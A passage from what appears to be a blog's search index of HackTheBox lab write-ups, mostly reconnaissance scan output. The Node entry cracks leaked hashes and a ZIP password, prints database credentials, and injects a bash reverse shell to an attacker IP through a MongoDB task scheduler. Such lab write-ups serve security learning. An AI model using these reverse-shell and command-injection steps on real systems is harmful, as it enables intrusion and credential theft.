www-data@europa:/var/www/cronjobs$ chmod +x /var/www/cmd/logcleared.sh After a minute we receive a shell ","date":"October 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/europa/images/europa.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/europa/","summary":"Europa Enumeration nmap └─$ nmap -Pn -p- 10.10.10.22 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-16 18:03 BST Nmap scan report for 10.10.10.22 (10.10.10.22) Host is up (0.11s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 36.67 seconds └─$ nmap -Pn -p22,80,443 -sC -sV 10.10.10.22 --min-rate 10000 Starting Nmap 7.","tags":["HTB","vhosts","wfuzz","sqli","injection","sqlmap","preg_replace","cron"],"title":"[HTB] Machine: Europa"},{"categories":null,"contents":"Nineveh Enumeration nmap ","date":"October 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/nineveh/images/nineveh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/nineveh/","summary":"Nineveh Enumeration nmap ","tags":["HTB"],"title":"[HTB] Machine: Nineveh"},{"categories":null,"contents":"Node Enumeration nmap └─$ nmap -Pn -p- 10.10.10.58 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 16:37 BST Nmap scan report for 10.10.10.58 (10.10.10.58) Host is up (0.11s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 3000/tcp open ppp Nmap done: 1 IP address (1 host up) scanned in 27.72 seconds └─$ nmap -Pn -p22,3000 -sC -sV 10.10.10.58 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 16:41 BST Nmap scan report for 10.10.10.58 (10.10.10.58) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA) | 256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA) |_ 256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519) 3000/tcp open hadoop-datanode Apache Hadoop |_http-title: MyPlace | hadoop-tasktracker-info: |_ Logs: /login | hadoop-datanode-info: |_ Logs: /login Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.12 seconds Web Server nmap showed hadoop If we ran nmap without -sC option, it will show NodeJS feroxbuster └─$ feroxbuster -u http://10.10.10.58:3000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x js,txt --depth 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.58:3000 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [js, txt] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 1 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 90l 249w 3861c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 301 GET 9l 15w 173c http://10.10.10.58:3000/uploads =\u0026gt; http://10.10.10.58:3000/uploads/ 301 GET 9l 15w 171c http://10.10.10.58:3000/assets =\u0026gt; http://10.10.10.58:3000/assets/ 301 GET 9l 15w 171c http://10.10.10.58:3000/vendor =\u0026gt; http://10.10.10.58:3000/vendor Foothold If we check source files, we see app.js and other files with the routes I scanned all routes and found /api/users/latest endpoint with user hashes And if we check /api/users/ we have additional user, which is admin Let\u0026rsquo;s try cracking hashes dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240 de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73 5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0 dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake Now we can login as administrator account and download backup myplace.backup └─$ file myplace.backup myplace.backup: ASCII text, with very long lines (65536), with no line terminators └─$ cat myplace.backup UEsDBAoAAAAAABqJEFUAAAAAAAAAAAAAAAAQABw... Looks like base64 └─$ cat myplace.backup | base64 -d \u0026gt; myplace.backup.decoded └─$ file myplace.backup.decoded myplace.backup.decoded: Zip archive data, at least v1.0 to extract, compression method=store The archive is protected with password └─$ mv myplace.backup.decoded myplace.zip └─$ unzip myplace.zip Archive: myplace.zip creating: var/www/myplace/ [myplace.zip] var/www/myplace/package-lock.json password: skipping: var/www/myplace/package-lock.json incorrect password ... Let\u0026rsquo;s crack it └─$ zip2john myplace.zip \u0026gt; myplace.hash └─$ john --wordlist=/usr/share/wordlists/rockyou.txt myplace.hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status magicword (myplace.zip) 1g 0:00:00:00 DONE (2023-10-17 17:33) 33.33g/s 6144Kp/s 6144Kc/s 6144KC/s sandriux..joan21 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Content └─$ tree -L 2 . . ├── html │ ├── assets │ ├── favicon.ico │ ├── files │ ├── index.php │ ├── logo.png │ ├── news.php │ └── Readme.txt └── myplace ├── app.html ├── app.js ├── node_modules ├── package.json ├── package-lock.json └── static 7 directories, 9 files app.js contains password for mark └─$ cat myplace/app.js const express = require(\u0026#39;express\u0026#39;); const session = require(\u0026#39;express-session\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const crypto = require(\u0026#39;crypto\u0026#39;); const MongoClient = require(\u0026#39;mongodb\u0026#39;).MongoClient; const ObjectID = require(\u0026#39;mongodb\u0026#39;).ObjectID; const path = require(\u0026#34;path\u0026#34;); const spawn = require(\u0026#39;child_process\u0026#39;).spawn; const app = express(); const url = \u0026#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT\u0026amp;authSource=myplace\u0026#39;; const backup_key = \u0026#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\u0026#39;; ... And we got a foothold User We have 2 processes ran by tom ... root 1153 1 0 16:10 ? 00:00:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog tom 1231 1 1 16:10 ? 00:01:38 /usr/bin/node /var/www/myplace/app.js mongodb 1233 1 0 16:10 ? 00:00:29 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf tom 1235 1 0 16:10 ? 00:00:01 /usr/bin/node /var/scheduler/app.js root 1240 1 0 16:10 ? 00:00:00 /usr/sbin/sshd -D ... Content of /var/scheduler/app.js It looks like it executes tasks from tasks collection const exec = require(\u0026#39;child_process\u0026#39;).exec; const MongoClient = require(\u0026#39;mongodb\u0026#39;).MongoClient; const ObjectID = require(\u0026#39;mongodb\u0026#39;).ObjectID; const url = \u0026#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT\u0026amp;authSource=scheduler\u0026#39;; MongoClient.connect(url, function(error, db) { if (error || !db) { console.log(\u0026#39;[!] Failed to connect to mongodb\u0026#39;); return; } setInterval(function () { db.collection(\u0026#39;tasks\u0026#39;).find().toArray(function (error, docs) { if (!error \u0026amp;\u0026amp; docs) { docs.forEach(function (doc) { if (doc) { console.log(\u0026#39;Executing task \u0026#39; + doc._id + \u0026#39;...\u0026#39;); exec(doc.cmd); db.collection(\u0026#39;tasks\u0026#39;).deleteOne({ _id: new ObjectID(doc._id) }); } }); } else if (error) { console.log(\u0026#39;Something went wrong: \u0026#39; + error); } }); }, 30000); }); Collection is empty mark@node:/var$ mongo -u mark -p 5AYRft73VtFpc84k scheduler MongoDB shell version: 3.2.16 connecting to: scheduler \u0026gt; show collections tasks \u0026gt; db.tasks.find() \u0026gt; We can test it by creating a simple task \u0026gt; db.tasks.insert({\u0026#34;cmd\u0026#34;: \u0026#34;touch /tmp/test\u0026#34;}) WriteResult({ \u0026#34;nInserted\u0026#34; : 1 }) \u0026gt; db.tasks.find() { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;652ebe1d90afb98861d029df\u0026#34;), \u0026#34;cmd\u0026#34; : \u0026#34;touch /tmp/test\u0026#34; } \u0026gt; After few seconds, the file is created mark@node:/var$ ls /tmp/ mongodb-27017.sock systemd-private-ee21381a291b4f8984a6c8ef6a4fb99b-systemd-timesyncd.service-yctj9M test vmware-root Let\u0026rsquo;s get reverse shell \u0026gt; db.tasks.find() \u0026gt; db.tasks.insert({\u0026#34;cmd\u0026#34;: \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.9/6666 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;}) WriteResult({ \u0026#34;nInserted\u0026#34; : 1 }) \u0026gt; Root ","date":"October 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/node/images/node.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/node/","summary":"Node Enumeration nmap └─$ nmap -Pn -p- 10.10.10.58 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 16:37 BST Nmap scan report for 10.10.10.58 (10.10.10.58) Host is up (0.11s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 3000/tcp open ppp Nmap done: 1 IP address (1 host up) scanned in 27.72 seconds └─$ nmap -Pn -p22,3000 -sC -sV 10.10.10.58 --min-rate 10000 Starting Nmap 7.","tags":["HTB"],"title":"[HTB] Machine: Node"},{"categories":null,"contents":"SolidState Enumeration nmap ","date":"October 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/solidstate/images/solidstate.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/solidstate/","summary":"SolidState Enumeration nmap ","tags":["HTB"],"title":"[HTB] Machine: SolidState"},{"categories":null,"contents":"PC Enumeration nmap └─$ sudo nmap -Pn -p- 10.10.11.214 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 20:30 BST Nmap scan report for 10.10.11.214 (10.10.11.214) Host is up (0.095s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 50051/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 139.58 seconds └─$ nmap -Pn -p22,50051 -sC -sV 10.10.11.214 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 20:34 BST Nmap scan report for 10.10.11.214 (10.10.11.214) Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 91bf44edea1e3224301f532cea71e5ef (RSA) | 256 8486a6e204abdff71d456ccf395809de (ECDSA) |_ 256 1aa89572515e8e3cf180f542fd0a281c (ED25519) 50051/tcp open unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port50051-TCP:V=7.93%I=7%D=5/27%Time=64725B44%P=x86_64-pc-linux-gnu%r(N SF:ULL,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x0 SF:6\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(Generic SF:Lines,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\ SF:x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(GetRe SF:quest,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\ SF:x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(HTTPO SF:ptions,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0 SF:\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(RTSP SF:Request,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\ SF:0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(RPC SF:Check,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\ SF:x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(DNSVe SF:rsionBindReqTCP,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\ SF:xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0 SF:\u0026#34;)%r(DNSStatusRequestTCP,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0 SF:\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\ SF:0\\0\\?\\0\\0\u0026#34;)%r(Help,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0 SF:\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\ SF:0\\0\u0026#34;)%r(SSLSessionReq,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x0 SF:5\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0 SF:\\?\\0\\0\u0026#34;)%r(TerminalServerCookie,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xf SF:f\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0 SF:\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(TLSSessionReq,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\? SF:\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x0 SF:8\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(Kerberos,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\x SF:ff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\ SF:0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(SMBProgNeg,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\x SF:ff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\ SF:0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(X11Probe,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff SF:\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\ SF:0\\0\\0\\0\\0\\?\\0\\0\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.19 seconds Foothold/User nc port 50051 Googling indicates it might be gRPC https://xrpl.org/configure-grpc.html There is a pentesting post gRPC User ","date":"October 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/pc/images/pc.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/pc/","summary":"PC Enumeration nmap └─$ sudo nmap -Pn -p- 10.10.11.214 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 20:30 BST Nmap scan report for 10.10.11.214 (10.10.11.214) Host is up (0.095s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 50051/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 139.58 seconds └─$ nmap -Pn -p22,50051 -sC -sV 10.10.11.214 -T5 Starting Nmap 7.93 ( https://nmap.","tags":["HTB"],"title":"[HTB] Machine: PC"},{"categories":null,"contents":"Absolute Enumeration nmap └─$ nmap -Pn -p- 10.10.11.181 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 19:44 BST Nmap scan report for 10.10.11.181 (10.10.11.181) Host is up (0.10s latency). Not shown: 65509 closed ports PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49686/tcp open unknown 49692/tcp open unknown 49699/tcp open unknown 49703/tcp open unknown └─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.11.181 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 19:36 BST Nmap scan report for 10.10.11.181 (10.10.11.181) Host is up (0.18s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Absolute 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-04 01:35:57Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-10-04T01:36:48+00:00; +6h59m17s from scanner time. | ssl-cert: Subject: commonName=dc.absolute.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.absolute.htb | Not valid before: 2023-07-17T21:11:52 |_Not valid after: 2024-07-16T21:11:52 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-10-04T01:36:49+00:00; +6h59m17s from scanner time. | ssl-cert: Subject: commonName=dc.absolute.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.absolute.htb | Not valid before: 2023-07-17T21:11:52 |_Not valid after: 2024-07-16T21:11:52 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.absolute.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.absolute.htb | Not valid before: 2023-07-17T21:11:52 |_Not valid after: 2024-07-16T21:11:52 |_ssl-date: 2023-10-04T01:36:48+00:00; +6h59m17s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-10-04T01:36:49+00:00; +6h59m17s from scanner time. | ssl-cert: Subject: commonName=dc.absolute.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.absolute.htb | Not valid before: 2023-07-17T21:11:52 |_Not valid after: 2024-07-16T21:11:52 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2023-10-04T01:36:42 |_ start_date: N/A |_clock-skew: mean: 6h59m16s, deviation: 0s, median: 6h59m16s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 59.79 seconds smb └─$ smbclient -N -L //10.10.11.181 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.11.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available ldap └─$ ldapsearch -H ldap://dc.absolute.htb -x -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=absolute,DC=htb namingcontexts: CN=Configuration,DC=absolute,DC=htb namingcontexts: CN=Schema,CN=Configuration,DC=absolute,DC=htb namingcontexts: DC=DomainDnsZones,DC=absolute,DC=htb namingcontexts: DC=ForestDnsZones,DC=absolute,DC=htb # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 └─$ ldapsearch -H ldap://dc.absolute.htb -x -b \u0026#34;DC=absolute,DC=htb\u0026#34; # extended LDIF # # LDAPv3 # base \u0026lt;DC=absolute,DC=htb\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # search result search: 2 result: 1 Operations error text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v4563 # numResponses: 1 dns └─$ dig absolute.htb @dc.absolute.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; absolute.htb @dc.absolute.htb ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 38236 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;absolute.htb. IN A ;; ANSWER SECTION: absolute.htb. 600 IN A 10.10.11.181 ;; Query time: 103 msec ;; SERVER: 10.10.11.181#53(dc.absolute.htb) (UDP) ;; WHEN: Wed Oct 04 17:29:51 BST 2023 ;; MSG SIZE rcvd: 57 └─$ dig axfr absolute.htb @dc.absolute.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr absolute.htb @dc.absolute.htb ;; global options: +cmd ; Transfer failed. dnsenum └─$ dnsenum --dnsserver 10.10.11.181 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt absolute.htb dnsenum VERSION:1.2.6 ----- absolute.htb ----- Host\u0026#39;s addresses: __________________ absolute.htb. 600 IN A 10.10.11.181 Name Servers: ______________ dc.absolute.htb. 1200 IN A 10.10.11.181 Mail (MX) Servers: ___________________ Trying Zone Transfers and getting Bind Versions: _________________________________________________ unresolvable name: dc.absolute.htb at /usr/bin/dnsenum line 900. Trying Zone Transfer for absolute.htb on dc.absolute.htb ... AXFR record query failed: no nameservers Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt: ________________________________________________________________________________________ dc.absolute.htb. 1200 IN A 10.10.11.181 domaindnszones.absolute.htb. 600 IN A 10.10.11.181 forestdnszones.absolute.htb. 600 IN A 10.10.11.181 absolute.htb class C netranges: ________________________________ Performing reverse lookup on 0 ip addresses: _____________________________________________ 0 results out of 0 IP addresses. absolute.htb ip blocks: ________________________ done. Web Server gobuster └─$ gobuster dir -u http://absolute.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -x asp,aspx -k =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://absolute.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: asp,aspx [+] Timeout: 10s =============================================================== 2023/10/04 18:21:54 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 150] [--\u0026gt; http://absolute.htb/images/] /css (Status: 301) [Size: 147] [--\u0026gt; http://absolute.htb/css/] /js (Status: 301) [Size: 146] [--\u0026gt; http://absolute.htb/js/] /fonts (Status: 301) [Size: 149] [--\u0026gt; http://absolute.htb/fonts/] feroxbuster └─$ feroxbuster -u http://absolute.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://absolute.htb 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 301 GET 2l 10w 150c http://absolute.htb/images =\u0026gt; http://absolute.htb/images/ 301 GET 2l 10w 146c http://absolute.htb/js =\u0026gt; http://absolute.htb/js/ 301 GET 2l 10w 147c http://absolute.htb/css =\u0026gt; http://absolute.htb/css/ 200 GET 33l 64w 782c http://absolute.htb/js/main.js 200 GET 6l 77w 3351c http://absolute.htb/css/owl.carousel.min.css 200 GET 145l 442w 4030c http://absolute.htb/css/style.css 200 GET 5l 369w 21003c http://absolute.htb/js/popper.min.js 200 GET 7l 277w 44342c http://absolute.htb/js/owl.carousel.min.js 200 GET 4919l 8218w 79820c http://absolute.htb/fonts/icomoon/style.css 200 GET 0l 0w 86926c http://absolute.htb/js/jquery-3.3.1.min.js 200 GET 0l 0w 77906c http://absolute.htb/css/animate.css 200 GET 0l 0w 5501527c http://absolute.htb/images/hero_6.jpg 200 GET 0l 0w 1834774c http://absolute.htb/images/hero_5.jpg 200 GET 0l 0w 2085276c http://absolute.htb/images/hero_4.jpg 200 GET 0l 0w 160392c http://absolute.htb/css/bootstrap.min.css 200 GET 0l 0w 374185c http://absolute.htb/images/hero_2.jpg 200 GET 0l 0w 63240c http://absolute.htb/js/bootstrap.min.js 200 GET 0l 